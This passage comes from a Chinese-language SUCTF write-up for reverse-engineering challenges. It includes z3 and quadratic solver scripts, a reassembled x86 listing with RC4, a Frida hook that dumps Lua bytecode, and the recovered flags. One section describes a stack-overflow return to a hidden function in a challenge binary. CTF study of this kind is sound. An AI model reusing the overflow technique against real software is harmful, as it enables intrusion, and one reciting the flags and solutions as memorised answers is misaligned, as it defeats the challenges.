2flag[13] = (148 + flag[18] + flag[13])flag[19] = (152 + flag[9] + flag[19])flag[27] = (238 ^ (140 + flag[27] + flag[14])) + 50flag[17] = (148 ^ flag[25]) + flag[17]flag[8] = (77 ^ flag[20]) + flag[8]flag[5] = (19 ^ (47 + flag[5] + flag[17])) + 238flag[24] = (182 + flag[14] + flag[24])flag[9] = (172 ^ (27 + flag[9]) ^ flag[31]) + 210flag[6] = (211 ^ flag[2]) + flag[6]flag[11] = (80 ^ flag[28]) + flag[11]flag[13] = (12 ^ 33 ^ (flag[13] + flag[5])) + 61flag[22] = (231 ^ (178 + flag[22] + flag[8])) + 197flag[1] = (203 + flag[13] + flag[1])flag[9] = (72 ^ (215 + flag[9] + flag[6])) + 116flag[30] = (183 + flag[14] + flag[30])flag[25] = (27 + 107 + flag[25] + flag[4] + 100)flag[4] = (19 ^ (111 + flag[4]) ^ flag[16]) + 235flag[5] = (220 ^ flag[15]) + flag[5]flag[24] = ((60 + 163) ^ (flag[24] + flag[0])) + 164flag[27] = ((99 + flag[27]) ^ flag[7]) + 25flag[25] = (163 + flag[28] + flag[25])flag[25] = (24 ^ (flag[25] + flag[4])) + 54flag[10] = ((189 + 29 + flag[10]) ^ flag[16]) + 214flag[5] = (13 + flag[5] + flag[21] + 160)flag[30] = (92 ^ (208 + flag[30]) ^ flag[13]) + 189flag[26] = (246 ^ flag[26] ^ flag[15]) + 93flag[30] = ((59 + 0 + flag[30]) ^ flag[7]) + 72flag[1] = (136 ^ (flag[1] + flag[9])) + 111flag[25] = (65 ^ (flag[25] + flag[0])) + 98flag[17] = (92 + flag[21] + flag[17])flag[15] = (42 ^ (flag[15] + flag[17])) + 1flag[31] = (183 ^ flag[4]) + flag[31]flag[24] = (242 + flag[24] + flag[18] + 28)flag[6] = (1 + flag[1] + flag[6])flag[9] = (15 ^ 154 ^ (flag[9] + flag[10])) + 152flag[8] = (55 ^ flag[2]) + flag[8]flag[29] = (255 + 250 + flag[29] + flag[23] + 46)flag[17] = (68 ^ (flag[17] + flag[22])) + 165flag[8] = ((104 + 249 + flag[8]) ^ flag[5]) + 0flag[0] = (53 + flag[0] + flag[24] + 224)flag[17] = (222 ^ flag[1]) + flag[17]flag[10] = ((82 + 98) ^ flag[10] ^ flag[2]) + 180flag[14] = (128 ^ (166 + flag[14] + flag[1])) + 25flag[0] = (165 ^ flag[29]) + flag[0]flag[13] = (72 + flag[15] + flag[13])flag[19] = (36 + flag[19] + flag[30] + 59)flag[17] = (196 + flag[9] + flag[17])flag[17] = (183 + 160 + flag[17] + flag[4] + 96)flag[11] = (244 + flag[28] + flag[11])flag[29] = (87 + flag[29] + flag[30] + 189)flag[19] = (99 + 149 + flag[19] + flag[0] + 162)flag[6] = (177 + flag[3] + flag[6])flag[25] = (103 ^ (flag[25] + flag[30])) + 162flag[29] = (148 + flag[29] + flag[13] + 8)flag[14] = ((241 + flag[14]) ^ flag[15]) + 17flag[7] = (139 + flag[23] + flag[7])flag[30] = (152 + flag[9] + flag[30])flag[23] = (113 + flag[23] + flag[4] + 54)flag[9] = ((89 + flag[9]) ^ flag[12]) + 79flag[19] = (39 + 230 + flag[19] + flag[27] + 189)flag[23] = ((37 + 51 + flag[23]) ^ flag[24]) + 147flag[1] = (196 + 252 + flag[1] + flag[4] + 224)flag[20] = (67 + flag[2] + flag[20])flag[8] = (43 ^ flag[13]) + flag[8]flag[6] = (137 ^ 30 ^ (flag[6] + flag[7])) + 54flag[3] = (74 ^ flag[22]) + flag[3]flag[28] = (110 + flag[17] + flag[28])flag[20] = ((178 + 197 + flag[20]) ^ flag[9]) + 141flag[7] = (142 ^ (flag[7] + flag[10])) + 230flag[25] = (82 ^ flag[25] ^ flag[2]) + 242flag[23] = (191 ^ flag[23] ^ flag[7]) + 201flag[11] = (137 + flag[11] + flag[18] + 34)flag[8] = (49 + 173 + flag[8] + flag[5] + 117)flag[23] = (172 + 111 + flag[23] + flag[22] + 235)flag[10] = (250 + flag[20] + flag[10])flag[27] = (131 + 12 + flag[27] + flag[16] + 38)flag[28] = (179 + flag[28] + flag[19] + 115)flag[23] = (108 + flag[27] + flag[23])flag[9] = (121 ^ 144 ^ (flag[9] + flag[26])) + 23flag[22] = ((213 + 23 + flag[22]) ^ flag[31]) + 108flag[0] = ((140 + 168) ^ (flag[0] + flag[30])) + 85flag[19] = ((125 + 83) ^ (flag[19] + flag[27])) + 129flag[19] = (9 + flag[28] + flag[19])flag[13] = (228 + flag[13] + flag[13] + 182)flag[2] = (105 + flag[8] + flag[2])flag[30] = (40 ^ flag[10]) + flag[30]flag[28] = (146 ^ (flag[28] + flag[23])) + 143flag[18] = ((201 + 238 + flag[18]) ^ flag[12]) + 211flag[19] = (78 + 148 + flag[19] + flag[25] + 110)flag[18] = (57 + flag[27] + flag[18])flag[14] = (180 + flag[15] + flag[14])flag[25] = ((177 + flag[25]) ^ flag[31]) + 104flag[18] = (46 ^ (172 + flag[18]) ^ flag[27]) + 100flag[14] = (255 ^ flag[14] ^ flag[29]) + 61flag[8] = (226 + flag[8] + flag[14] + 103)flag[29] = ((188 + 12) ^ (flag[29] + flag[1])) + 164flag[5] = (229 ^ flag[18]) + flag[5]flag[2] = (8 + flag[2] + flag[3] + 184)flag[20] = (45 + flag[23] + flag[20])flag[6] = (230 ^ flag[6] ^ flag[9]) + 243flag[4] = (174 + flag[4] + flag[11] + 101)flag[11] = (68 + 19 + flag[11] + flag[15] + 124)flag[11] = (48 + flag[4] + flag[11])flag[4] = ((111 + 60 + flag[4]) ^ flag[3]) + 172flag[25] = (192 ^ (99 + flag[25] + flag[21])) + 128flag[3] = ((167 + 163 + flag[3]) ^ flag[20]) + 48flag[22] = ((28 + 24 + flag[22]) ^ flag[19]) + 160flag[22] = (68 + 189 + flag[22] + flag[29] + 51)flag[0] = (80 + flag[4] + flag[0])flag[29] = (117 + flag[29] + flag[16] + 142)flag[29] = (141 + flag[29] + flag[10] + 137)flag[8] = (175 ^ flag[8] ^ flag[0]) + 126flag[15] = (7 ^ flag[25]) + flag[15]flag[2] = ((105 + 65 + flag[2]) ^ flag[18]) + 60flag[4] = (96 ^ (flag[4] + flag[15])) + 47flag[1] = (85 ^ flag[27]) + flag[1]flag[11] = (81 + 183 + flag[11] + flag[18] + 177)flag[28] = ((228 + flag[28]) ^ flag[20]) + 254flag[23] = (50 ^ (1 + flag[23]) ^ flag[23]) + 57flag[24] = (1 + flag[26] + flag[24])flag[28] = (10 ^ (55 + flag[28] + flag[15])) + 134flag[14] = (98 + flag[14] + flag[26] + 165)flag[5] = (215 ^ (flag[5] + flag[31])) + 225flag[0] = (86 + flag[25] + flag[0])flag[0] = ((101 + 53) ^ (flag[0] + flag[26])) + 207flag[31] = (152 ^ flag[30]) + flag[31]flag[20] = ((65 + flag[20]) ^ flag[2]) + 69flag[25] = (194 ^ (flag[25] + flag[6])) + 105flag[19] = (65 ^ flag[14]) + flag[19]flag[11] = (29 ^ flag[8]) + flag[11]flag[27] = (175 ^ flag[16]) + flag[27]flag[8] = (254 + flag[8] + flag[10] + 215)flag[0] = (201 ^ flag[0]) + flag[0]flag[18] = (68 + flag[30] + flag[18])flag[29] = ((60 + flag[29]) ^ flag[18]) + 101flag[2] = (190 + flag[21] + flag[2])flag[11] = (128 ^ flag[11] ^ flag[2]) + 38flag[2] = (195 + flag[3] + flag[2])flag[8] = ((222 + flag[8]) ^ flag[1]) + 210flag[17] = (109 + flag[17] + flag[13] + 90)flag[28] = (143 + flag[7] + flag[28])flag[4] = (247 ^ (152 + flag[4]) ^ flag[22]) + 249flag[22] = ((233 + flag[22]) ^ flag[10]) + 163flag[15] = (132 ^ flag[7]) + flag[15]flag[29] = (172 + flag[6] + flag[29])flag[19] = ((123 + flag[19]) ^ flag[19]) + 225flag[0] = (152 + flag[0] + flag[28] + 34)flag[10] = (68 + flag[23] + flag[10])flag[23] = (130 + flag[23] + flag[24] + 17)flag[22] = (141 + 137 + flag[22] + flag[30] + 254)flag[8] = (71 + 74 + flag[8] + flag[5] + 232)flag[9] = (118 ^ (flag[9] + flag[13])) + 115flag[13] = (241 + flag[13] + flag[5] + 101)flag[6] = ((73 + 142) ^ (flag[6] + flag[17])) + 217flag[18] = (202 + flag[18] + flag[10] + 222)flag[9] = (226 + flag[9] + flag[26] + 8)flag[2] = (7 + flag[10] + flag[2])flag[21] = (114 + flag[13] + flag[21])for i in range(32):    s.add(flag[i] == mw[i])    solutions = []while s.check() == sat:    model = s.model()    solution = [0] * 32    for d in model.decls():        solution[int(d.name().split(\"_\")[1])] = model[d].as_long()    print(bytes(solution).decode())        s.add(Or([flag[i] != solution[i] for i in range(32)]))# SUCTF{Y0u_Ar3_Andr0id_M4st3r!!!}\n\nSU_Harmony简单一元二次方程\n到手后提取出 abc 和 libentry.so，ark层没啥东西，就是调用so\n\n在 RegisterEntryModule 下找到注册函数调用，然后找到 check 函数注册位置\n\n有点混淆，但是问题不大，不是很影响\n关键是这里，把输入的内容拼成 int 后传进去加密，然后和结果数字表比较\n\n加密函数关键都在头部，是个高精度操作，总结起来就是 \n\n然后用一元二次求根公式就行了\nimport mathfrom Crypto.Util.number import long_to_bytesdt = [    999272289930604998,    1332475531266467542,    1074388003071116830,    1419324015697459326,    978270870200633520,    369789474534896558,    344214162681978048,    2213954953857181622]# 2 * (x * x + 2 * x - 3) = dt# print(math.sqrt(999272289930605002))for x in dt:    c = (2 * x) + 3    delta = 4 + 4 * c    delta = math.sqrt(delta)    sol = (-2 + delta) / 2    sol = int(sol)    print(long_to_bytes(sol)[::-1].decode(), end=\"\")# SUCTF{Ma7h_WorldIs_S0_B3aut1ful}\n\nSU_minesweeper又是一个 z3 题，题目把输入的内容两两拼接成 uint8 存进数组\n\n然后这个字符对应集和标准hex是不一样的，是 abcdef0123456789\n一共 50 个 uint8，拆成 400 位，20 * 20 的矩阵\n然后这个函数按照 wtMap 来判断以 [i][j] 为中心的 3 * 3 网格内 1 的数量是否等于 wtMap 里的值\n\n这个函数就是在提取 第 i 行的 j 位\n\n然后就可以用 z3 去解了\nfrom z3 import *a = [0x03, 0x04, 0xFF, 0xFF, 0xFF, 0x05, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x04, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0x02, 0xFF, 0xFF, 0x04, 0xFF, 0x07, 0xFF, 0xFF, 0xFF, 0x04, 0x06, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0x06, 0x05, 0x06, 0x04, 0xFF, 0x05, 0xFF, 0x04, 0x07, 0xFF, 0x08, 0xFF, 0x06, 0xFF, 0xFF, 0x06, 0x06, 0x05, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x03, 0x03, 0xFF, 0x03, 0xFF, 0x05, 0x06, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0x04, 0x05, 0x04, 0x05, 0x07, 0x06, 0xFF, 0xFF, 0x04, 0xFF, 0x02, 0x01, 0xFF, 0xFF, 0xFF, 0x03, 0x04, 0xFF, 0xFF, 0x05, 0x04, 0x03, 0xFF, 0xFF, 0x07, 0x04, 0x03, 0xFF, 0xFF, 0x01, 0x01, 0xFF, 0xFF, 0x04, 0x03, 0xFF, 0x02, 0xFF, 0x04, 0x03, 0xFF, 0xFF, 0x02, 0xFF, 0x05, 0x04, 0xFF, 0xFF, 0x02, 0x02, 0xFF, 0xFF, 0x04, 0xFF, 0x04, 0xFF, 0x03, 0x05, 0x06, 0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x02, 0xFF, 0xFF, 0xFF, 0x01, 0x04, 0xFF, 0xFF, 0x07, 0x05, 0xFF, 0xFF, 0x03, 0x03, 0x02, 0xFF, 0xFF, 0x04, 0xFF, 0xFF, 0x05, 0x07, 0xFF, 0x03, 0x02, 0x04, 0x04, 0xFF, 0x07, 0x05, 0x04, 0x03, 0xFF, 0xFF, 0x04, 0xFF, 0x02, 0x04, 0x05, 0xFF, 0xFF, 0x06, 0x05, 0x04, 0xFF, 0x02, 0xFF, 0xFF, 0x07, 0x04, 0xFF, 0xFF, 0x03, 0xFF, 0x04, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x04, 0x03, 0x02, 0x02, 0xFF, 0xFF, 0x02, 0x04, 0x03, 0x05, 0xFF, 0xFF, 0x05, 0xFF, 0x04, 0xFF, 0x06, 0xFF, 0xFF, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0x03, 0x03, 0xFF, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x06, 0xFF, 0x06, 0x06, 0xFF, 0x07, 0x06, 0x04, 0xFF, 0x04, 0x03, 0xFF, 0x04, 0x03, 0x05, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x04, 0x06, 0x07, 0xFF, 0xFF, 0x04, 0xFF, 0xFF, 0xFF, 0x07, 0xFF, 0x05, 0xFF, 0x05, 0xFF, 0xFF, 0x06, 0x07, 0x07, 0xFF, 0x05, 0x06, 0x06, 0xFF, 0xFF, 0x02, 0x04, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x06, 0xFF, 0xFF, 0x07, 0x07, 0x06, 0xFF, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0x03, 0xFF, 0x03, 0x05, 0xFF, 0x07, 0xFF, 0x05, 0xFF, 0x06, 0xFF, 0x05, 0xFF, 0xFF, 0x07, 0x08, 0xFF, 0xFF, 0x03, 0xFF, 0x03, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x03, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x06, 0x05, 0x03, 0xFF, 0x04, 0x05, 0x05, 0x03, 0xFF, 0xFF, 0x06, 0x05, 0x05, 0x06, 0xFF, 0x06, 0x05, 0x02, 0x04, 0x03, 0x04, 0xFF, 0xFF, 0x03, 0x04, 0x04, 0x06, 0x05, 0xFF, 0x03, 0xFF, 0x05, 0x05, 0x05, 0xFF, 0xFF, 0x05, 0xFF, 0xFF, 0x04, 0xFF, 0xFF, 0x04, 0xFF, 0x07, 0x07, 0x08, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0x05, 0xFF, 0xFF, 0xFF, 0x04, 0xFF, 0x03, 0xFF, 0x03, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x05, 0x03]bit_matrix = [[BitVec(f\"x_{i}_{j}\", 32) for j in range(20)] for i in range(20)]s = Solver()for i in range(20):    for j in range(20):        if a[20 * i + j] != 0xFF:            tmp_i = i            tmp_j = j            addTmp_expr = []            for k1 in range(-1, 2, 1):                for k2 in range(-1, 2, 1):                    new_i = tmp_i + k1                    new_j = tmp_j + k2                                        if new_i &gt;= 0 and new_i &lt;= 19 and new_j &gt;= 0 and new_j &lt;= 19:                        addTmp_expr.append(bit_matrix[new_i][new_j])                        s.add(Sum(addTmp_expr) == a[20 * i + j])for i in range(20):    for j in range(20):        s.add(Or(bit_matrix[i][j] == 0, bit_matrix[i][j] == 1))solutions = []while s.check() == sat:    model = s.model()    # 提取当前解    solution = [[model.evaluate(bit_matrix[i][j]).as_long() for j in range(20)] for i in range(20)]    solutions.append(solution)        for i in range(20):        for j in range(20):            if a[20 * i + j] != 0xFF:                tmp_i = i                tmp_j = j                addTmp = 0                for k1 in range(-1, 2, 1):                    for k2 in range(-1, 2, 1):                        new_i = tmp_i + k1                        new_j = tmp_j + k2                                                if new_i &gt;= 0 and new_i &lt;= 19 and new_j &gt;= 0 and new_j &lt;= 19:                            addTmp = addTmp + solution[new_i][new_j]                print(addTmp, a[20 * i + j])                if addTmp != a[20 * i + j]:                    exit()        print(solution)    block = []    for i in range(20):        for j in range(20):            block.append(bit_matrix[i][j] == solution[i][j])    s.add(Not(And(block)))print(\"Done\")for idx, solution in enumerate(solutions):    print(f\"Solution {idx + 1}:\")    for row in solution:        print(row)    print()\n\n我在写脚本的时候为了方便比特位是顺序过去的，但是上面的提取比特函数是有 “端序” 的，得到答案矩阵后每次截取 8 位需要逆转一下才是正确答案\nsolution = [[1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1], [0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1], [0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1], [1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0], [0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0], [0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1], [1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1], [0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1], [1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0], [1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0], [1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1], [0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0], [1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1], [1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1], [1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1], [0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0], [1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0], [1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0], [1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1], [0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0]]def recovery(dt):    if dt &lt;= 5:        return chr(dt + 97)    else:        return chr(dt + 42)newSol = [0] * 400result = \"\"for i in range(20):    for j in range(20):        newSol[i * 20 + j] = solution[i][j]        for i in range(0, 400, 8):    dt = newSol[i: i + 8][::-1]    dt = [str(_) for _ in dt]    dt = \"\".join(dt)    dt = int(dt, 2)        part1 = (dt &gt;&gt; 4) &amp; 0xF    part2 = dt &amp; 0xF        part1 = recovery(part1)    part2 = recovery(part2)        result += part1 + part2print(result)    # f57503596fb80f955fa5cad3cb282aa18ac62922a1981ea7b53b07a30709b508f3176601154250d509b7bee0f2170b898617# SUCTF{d661b98e4241de7423ef2d953098329d}\n\nSU_BBRE我好像选了个笨办法。。。把所有汇编转换成 asm，然后 nasm + gcc 编译再用 ida 看\nsection .data    format db \"please input your flag:\", 0    a19s db \"%19s\", 0    aS db \"%s\", 0    aSuctf db \"suctf\", 0    s db \"hhh,you find me:\", 0    aCongratulate db \"congratulate!!!\", 0section .bss    src resb 100extern printfextern __isoc99_scanfextern putsextern exitextern strcpysection .textglobal _start_start:    lea ecx, [esp + 4]    and esp, 0FFFFFFF0h    push dword [ecx - 4]    push ebp    mov ebp, esp    push ecx    sub esp, 74h    sub esp, 0Ch    push format    call printf    add esp, 10h    sub esp, 8    lea eax, [ebp - 6Ch]    push eax    push a19s    call __isoc99_scanf    add esp, 10h    sub esp, 0Ch    lea eax, [ebp - 6Ch]    push eax    call function2    add esp, 10h    sub esp, 0Ch    lea eax, [ebp - 6Ch]    push eax    call function0    add esp, 10h    mov     eax, 0    mov     ecx, [ebp-4]    leave    lea     esp, [ecx-4]    retfunction1:    push    ebp    mov     ebp, esp    sub     esp, 28h    mov     dword [ebp-1Fh], 4D626D41h    mov     dword [ebp-1Bh], 294E4953h    mov     byte [ebp-17h], 28h ; '('    sub     esp, 0Ch    push    s        ; \"hhh,you find me:\"    call    puts    add     esp, 10h    sub     esp, 8    lea     eax, [ebp-16h]    push    eax    push    aS       ; \"%s\"    call    __isoc99_scanf    add     esp, 10h    mov     dword [ebp-0Ch], 0    jmp     short loc_4022B5    loc_402282:    lea     edx, [ebp-16h]    mov     eax, [ebp-0Ch]    add     eax, edx    movzx   eax, byte [eax]    movsx   eax, al    sub     eax, [ebp-0Ch]    mov     edx, eax    lea     ecx, [ebp-1Fh]    mov     eax, [ebp-0Ch]    add     eax, ecx    movzx   eax, byte [eax]    movsx   eax, al    cmp     edx, eax    jz      short loc_4022B1    sub     esp, 0Ch    push    0               ; status    call    exit    loc_4022B1:    add     dword [ebp-0Ch], 1    loc_4022B5:    cmp     dword [ebp-0Ch], 8    jle     short loc_402282    sub     esp, 0Ch    push    aCongratulate ; \"congratulate!!!\"    call    puts    add     esp, 10h    sub     esp, 0Ch    push    0               ; status    call    exitfunction0:    push    ebp    mov     ebp, esp    sub     esp, 18h    sub     esp, 8    push    dword [ebp+8]       ; src    lea     eax, [ebp-0Ch]    push    eax             ; dest    call    strcpy    add     esp, 10h    mov     eax, 0    leave    retnfunction2:    push    ebp    mov     ebp, esp    sub     esp, 28h    mov     dword [ebp-1Ch], 65575A2Fh    mov     dword [ebp-18h], 0CD698F14h    mov     dword [ebp-14h], 551A2993h    mov     dword [ebp-10h], 5EE44018h    push    10h    push    dword [ebp+8]    push    5    push    aSuctf   ; \"suctf\"    call    function5    add     esp, 10h    mov     dword [ebp-0Ch], 0    jmp     short loc_402364    loc_402333:    mov     edx, [ebp-0Ch]    mov     eax, [ebp+8]    add     eax, edx    movzx   eax, byte [eax]    movsx   eax, al    movzx   edx, al    lea     ecx, [ebp-1Ch]    mov     eax, [ebp-0Ch]    add     eax, ecx    movzx   eax, byte [eax]    movzx   eax, al    cmp     edx, eax    jz      short loc_402360    sub     esp, 0Ch    push    0               ; status    call    exit    loc_402360:    add     dword [ebp-0Ch], 1    loc_402364:    cmp     dword [ebp-0Ch], 0Fh    jle     short loc_402333    nop    nop    leave    retnfunction3:    push    ebp    mov     ebp, esp    sub     esp, 10h    mov     dword [ebp-8h], 0    mov     dword [ebp-4h], 0    jmp     short loc_402395    loc_402384:    mov     edx, [ebp-4h]    mov     eax, [ebp+10h]    add     eax, edx    mov     edx, [ebp-4h]    mov     [eax], dl    add     dword [ebp-4h], 1    loc_402395:    cmp     dword [ebp-4h], 0FFh    jle     short loc_402384    mov     dword [ebp-4h], 0    jmp     short loc_402416    loc_4023A7:    mov     edx, [ebp-4h]    mov     eax, [ebp+10h]    add     eax, edx    movzx   eax, byte [eax]    movzx   edx, al    mov     eax, [ebp-8h]    lea     ecx, [edx+eax]    mov     eax, [ebp-4h]    cdq    idiv    dword [ebp+0Ch]    mov     eax, edx    mov     edx, eax    mov     eax, [ebp+8h]    add     eax, edx    movzx   eax, byte [eax]    movzx   eax, al    add     eax, ecx    cdq    shr     edx, 18h    add     eax, edx    movzx   eax, al    sub     eax, edx    mov     [ebp-8h], eax    mov     edx, [ebp-4h]    mov     eax, [ebp+10h]    add     eax, edx    movzx   eax, byte [eax]    mov     [ebp-9h], al    mov     edx, [ebp-8h]    mov     eax, [ebp+10h]    add     eax, edx    mov     ecx, [ebp-4h]    mov     edx, [ebp+10h]    add     edx, ecx    movzx   eax, byte [eax]    mov     [edx], al    mov     edx, [ebp-8h]    mov     eax, [ebp+10h]    add     edx, eax    movzx   eax, byte [ebp-9h]    mov     [edx], al    add     dword [ebp-4h], 1    loc_402416:    cmp     dword [ebp-4h], 0FFh    jle     short loc_4023A7    nop    nop    leave    retnfunction4:    push    ebp    mov     ebp, esp    sub     esp, 20h    mov     dword [ebp-4], 0    mov     dword [ebp-8], 0    mov     dword [ebp-0Ch], 0    jmp     loc_4024F6    loc_402443:    mov     eax, [ebp-4]    add     eax, 1    cdq    shr     edx, 18h    add     eax, edx    movzx   eax, al    sub     eax, edx    mov     [ebp-4], eax    mov     edx, [ebp-4]    mov     eax, [ebp+8]    add     eax, edx    movzx   eax, byte [eax]    movzx   edx, al    mov     eax, [ebp-8]    add     eax, edx    cdq    shr     edx, 18h    add     eax, edx    movzx   eax, al    sub     eax, edx    mov     [ebp-8], eax    mov     edx, [ebp-4]    mov     eax, [ebp+8]    add     eax, edx    movzx   eax, byte [eax]    mov     [ebp-0Dh], al    mov     edx, [ebp-8]    mov     eax, [ebp+8]    add     eax, edx    mov     ecx, [ebp-4]    mov     edx, [ebp+8]    add     edx, ecx    movzx   eax, byte [eax]    mov     [edx], al    mov     edx, [ebp-8]    mov     eax, [ebp+8]    add     edx, eax    movzx   eax, byte [ebp-0Dh]    mov     [edx], al    mov     edx, [ebp-4]    mov     eax, [ebp+8]    add     eax, edx    movzx   edx, byte [eax]    mov     ecx, [ebp-8]    mov     eax, [ebp+8]    add     eax, ecx    movzx   eax, byte [eax]    add     eax, edx    movzx   edx, al    mov     eax, [ebp+8]    add     eax, edx    movzx   eax, byte [eax]    movzx   eax, al    mov     [ebp-14h], eax    mov     edx, [ebp-0Ch]    mov     eax, [ebp+0Ch]    add     eax, edx    movzx   eax, byte [eax]    mov     edx, eax    mov     eax, [ebp-14h]    mov     ecx, edx    xor     ecx, eax    mov     edx, [ebp-0Ch]    mov     eax, [ebp+0Ch]    add     eax, edx    mov     edx, ecx    mov     [eax], dl    add     dword [ebp-0Ch], 1    loc_4024F6:    mov     eax, [ebp-0Ch]    cmp     eax, [ebp+10h]    jl      loc_402443    nop    nop    leave    retnfunction5:    push    ebp    mov     ebp, esp    sub     esp, 100h    lea     eax, [ebp-100h]    push    eax    push    dword [ebp+0Ch]    push    dword [ebp+8]    call    function3    add     esp, 0Ch    push    dword [ebp+14h]    push    dword [ebp+10h]    lea     eax, [ebp-100h]    push    eax    call    function4    add     esp, 0Ch    nop    leave    retn\n\n\n一个简单 rc4 \n\n然后有一个隐藏的函数\n\n这里有一个栈溢出漏洞，RC4中也只加密16个字符，所以可以猜测是主函数中输入 20 个字符，末尾 4 个用来栈溢出，ret 到 function1，触发隐藏内容\n\nrc4解出来是 We1com3ToReWorld\nfunction1 的地址是 0x0040223D，转换成字符串就是 =\"@\nfunction1 解出来是 AndPWNT00\n拼接一下就是 We1com3ToReWorld=\"@AndPWNT00，SUCTF{We1com3ToReWorld=\"@AndPWNT00}\nSU_ezlua题目应该是魔改了 luac 的文件结构，我选择直接外部导入 liblua.so，然后调用里面的 luaU_dump 来 dump 一份 luac 修改代码来源 Sink\n\n然后修改下 Makefile 参数，编译出 liblua.so，之后使用 frida 载入，调用 luaL_dumpfile\nvar luac = Module.load(\"/mnt/d/CTF/scripts/frida/liblua.so\")var func_ptr = luac.findExportByName(\"luaL_dumpfile\")var dumpLua = new NativeFunction(func_ptr, \"int\", [\"pointer\", \"pointer\"]);var output = Memory.allocUtf8String(\"/mnt/d/CTF/scripts/frida/dump.luac\")Memory.protect(ptr(luac.base), luac.size, 'rwx');var module = Process.getModuleByName(\"lua\")Interceptor.attach(module.base.add(0x1CB70), {    onEnter: function(args) {        console.log(\"Hooked! Dumping...\")        this.L_object = args[0]    },    onLeave: function() {        console.log(this.L_object, output)        dumpLua(this.L_object, output)    }})\n\n没有魔改字节码 unluac 反编译得到\nlocal L0_1, L1_1function L0_1(A0_2)  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2  L2_2 = \"\"  L1_2 = \"0123456789abcdef\"  L6_2 = 1  L7_2 = string  L7_2 = L7_2.len  L8_2 = A0_2  L7_2 = L7_2(L8_2)  L8_2 = 1  for L9_2 = L6_2, L7_2, L8_2 do    L10_2 = string    L10_2 = L10_2.byte    L11_2 = A0_2    L12_2 = L9_2    L10_2 = L10_2(L11_2, L12_2)    L3_2 = L10_2    L10_2 = And    L11_2 = Shr    L12_2 = L3_2    L13_2 = 4    L11_2 = L11_2(L12_2, L13_2)    L12_2 = 15    L10_2 = L10_2(L11_2, L12_2)    L4_2 = L10_2    L10_2 = And    L11_2 = L3_2    L12_2 = 15    L10_2 = L10_2(L11_2, L12_2)    L5_2 = L10_2    L10_2 = L2_2    L11_2 = string    L11_2 = L11_2.sub    L12_2 = L1_2    L13_2 = L4_2 + 1    L14_2 = L4_2 + 1    L11_2 = L11_2(L12_2, L13_2, L14_2)    L12_2 = string    L12_2 = L12_2.sub    L13_2 = L1_2    L14_2 = L5_2 + 1    L15_2 = L5_2 + 1    L12_2 = L12_2(L13_2, L14_2, L15_2)    L2_2 = L10_2 .. L11_2 .. L12_2  end  return L2_2endhex = L0_1function L0_1(A0_2)  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2  L1_2 = string  L1_2 = L1_2.char  L2_2 = And  L3_2 = A0_2  L4_2 = 255  L2_2 = L2_2(L3_2, L4_2)  L3_2 = And  L4_2 = Shr  L5_2 = A0_2  L6_2 = 8  L4_2 = L4_2(L5_2, L6_2)  L5_2 = 255  L3_2 = L3_2(L4_2, L5_2)  L4_2 = And  L5_2 = Shr  L6_2 = A0_2  L7_2 = 16  L5_2 = L5_2(L6_2, L7_2)  L6_2 = 255  L4_2 = L4_2(L5_2, L6_2)  L5_2 = And  L6_2 = Shr  L7_2 = A0_2  L8_2 = 24  L6_2 = 